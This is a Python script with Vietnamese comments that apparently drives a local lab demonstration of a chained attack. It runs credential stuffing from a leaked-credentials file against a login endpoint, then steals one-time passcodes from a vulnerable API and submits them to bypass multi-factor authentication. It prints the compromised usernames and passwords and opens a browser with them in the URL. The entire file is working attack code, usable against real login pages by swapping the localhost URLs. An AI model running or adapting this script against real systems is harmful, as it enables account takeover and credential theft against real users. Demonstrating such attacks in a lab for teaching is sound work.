import time
import requests
import webbrowser
import sys
from tqdm import tqdm

# Đảm bảo in được emoji trên Windows
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

# Cấu hình
url = "http://localhost:5000/login"
steal_otp_url = "http://localhost:5000/api/steal-otp"
submit_otp_url = "http://localhost:5000/api/submit-otp"
credential_file = "data/leaked_credentials.txt"

def print_banner():
    print("\n" + "╔" + "═" * 62 + "╗")
    print("║" + " " * 10 + "⚡ ADVANCED CHAIN ATTACK SIMULATION ⚡" + " " * 14 + "║")
    print("║" + " " * 6 + "Credential Stuffing → MFA Bypass (OTP Theft)" + " " * 5 + "║")
    print("╚" + "═" * 62 + "╝\n")

def main():
    print_banner()
    start_time = time.time()

    # PHASE 1 & 2: Credential Stuffing
    print(f" [PHASE 1] Loading leaked credentials from {credential_file}...")
    try:
        with open(credential_file, "r", encoding="utf-8") as f:
            creds = [l.strip().split(",") for l in f if "," in l]
    except:
        print(f" [!] Error: {credential_file} not found.")
        return

    print(f" [PHASE 2] Starting Credential Stuffing on {url}...")
    mfa_triggered = []
    direct_access = []
    
    pbar = tqdm(total=len(creds), desc=" [STUFFING]", unit="acct", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]')
    for u, p in creds:
        try:
            resp = requests.post(url, data={"username": u, "password": p}, timeout=5)
            resp_text = resp.text.lower()
            if "mfa_required" in resp_text or "security verification" in resp_text or "otp" in resp_text:
                mfa_triggered.append((u, p))
                tqdm.write(f"  [+] Found Valid Credentials: {u} / {p} -> 🛡️ MFA Triggered")
            elif "access granted" in resp_text or "authentication successful" in resp_text:
                direct_access.append((u, p))
                tqdm.write(f"  [+] Found Valid Credentials: {u} / {p} -> ✅ Direct Access")
        except: 
            tqdm.write(f"  [!] Connection Error for {u}")
        pbar.update(1)
        time.sleep(0.1)
    pbar.close()

    # PHASE 3: MFA Bypass via OTP Theft
    print(f"\n [PHASE 3] Exploiting MFA Vulnerabilities for {len(mfa_triggered)} accounts...")
    takeover_success = []
    stolen_otps = 0

    for u, p in mfa_triggered:
        print(f"  [*] Attempting to intercept OTP for user: {u}...")
        time.sleep(1) # Mô phỏng thời gian chờ interception
        
        try:
            # Step 1: Steal OTP from vulnerable API
            steal_resp = requests.get(f"{steal_otp_url}/{u}", timeout=5)
            if steal_resp.status_code == 200:
                otp_data = steal_resp.json()
                otp = otp_data.get("otp")
                stolen_otps += 1
                print(f"      [!] SUCCESS: Stolen OTP '{otp}' for {u} (Method: {otp_data.get('method')})")
                
                # Step 2: Submit stolen OTP to bypass MFA
                submit_resp = requests.post(submit_otp_url, json={"username": u, "otp": otp}, timeout=5)
                if submit_resp.status_code == 200:
                    takeover_success.append((u, p, otp))
                    print(f"      [💀] ACCOUNT TAKEOVER COMPLETE: {u}")
                else:
                    print(f"      [❌] Bypass failed for {u}")
            else:
                print(f"      [❌] No OTP found to steal for {u}")
        except Exception as e:
            print(f"      [!] Error during bypass for {u}: {e}")

    total_time = time.time() - start_time
    
    # Final Summary
    print("\n" + "╔" + "═" * 62 + "╗")
    print("║" + " " * 22 + "ATTACK SUMMARY" + " " * 26 + "║")
    print("╠" + "═" * 62 + "╣")
    print(f"║  Total Time   : {total_time:.2f}s" + " " * (45 - len(f"{total_time:.2f}")) + "║")
    print(f"║  Phase 1/2   : {len(direct_access) + len(mfa_triggered)} valid credentials found" + " " * (28 - len(str(len(direct_access) + len(mfa_triggered)))) + "║")
    print(f"║  Phase 3     : {stolen_otps} OTPs intercepted, {len(takeover_success)} bypassed" + " " * (17 - len(str(stolen_otps)) - len(str(len(takeover_success)))) + "║")
    print("╠" + "═" * 62 + "╣")

    total_compromised = len(takeover_success) + len(direct_access)
    if total_compromised > 0:
        print("║  ⚠️  OVERALL STATUS: ATTACK SUCCESSFUL                        ║")
        print("╠" + "═" * 62 + "╣")
        print("║  Compromised accounts:                                       ║")
        for u, p, otp in takeover_success:
            line = f"    💀 {u} / {p} (OTP bypassed: {otp})"
            print(f"║  {line:<59}║")
        for u, p in direct_access:
            line = f"    🚪 {u} / {p} (no MFA)"
            print(f"║  {line:<59}║")
    else:
        print("║  ✅ OVERALL STATUS: ATTACK FAILED                             ║")
        print("║  MFA defense held against the chain attack                    ║")

    print("╠" + "═" * 62 + "╣")
    print("║  Vulnerabilities exploited:                                   ║")
    print("║    • Password reuse across breached databases                 ║")
    if stolen_otps > 0:
        print("║    • OTP not bound to session/IP                              ║")
        print("║    • OTP has no expiration                                    ║")
        print("║    • OTP can be reused (not single-use)                       ║")
        print("║    • OTP intercepted via phishing/SIM swap                    ║")
    print("╚" + "═" * 62 + "╝\n")

    if takeover_success:
        u, p, otp = takeover_success[0]
        print(f" [!] Opening web portal for compromised account (MFA Bypassed): {u}...")
        time.sleep(1)
        webbrowser.open(f"http://localhost:5000/?username={u}&password={p}&demo_success=true")
    elif direct_access:
        u, p = direct_access[0]
        print(f" [!] Opening web portal for compromised account (Direct Access): {u}...")
        time.sleep(1)
        webbrowser.open(f"http://localhost:5000/?username={u}&password={p}&demo_success=true")

if __name__ == "__main__":
    main()
